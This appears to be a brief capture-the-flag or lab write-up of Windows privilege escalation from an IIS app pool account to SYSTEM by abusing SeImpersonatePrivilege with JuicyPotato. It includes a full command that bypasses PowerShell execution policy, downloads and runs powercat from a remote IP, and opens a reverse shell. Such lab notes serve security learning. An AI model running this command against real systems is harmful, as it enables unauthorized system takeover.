As user `iis apppool\retro` 

```
whoami /priv
```
![[Pasted image 20240816115608.png]]

SEImpersonatePrivilege is enabled for the user

GodPotato, SweetPotato did not work

Using JuicyPotato
```bash
JuicyPotato.exe -l 1337 -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}" -p "C:\Windows\System32\cmd.exe" -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.6.32.24/powercat.ps1');powercat -c 10.6.32.24 -p 4459 -e powershell" -t *
```

Got [CLSID](https://ohpe.it/juicy-potato/CLSID/) for Windows Server 2016 based on the system information gathered using
```powershell
systeminfo
```

Ran the above command to gain a reverse shell as user `nt authority\system`

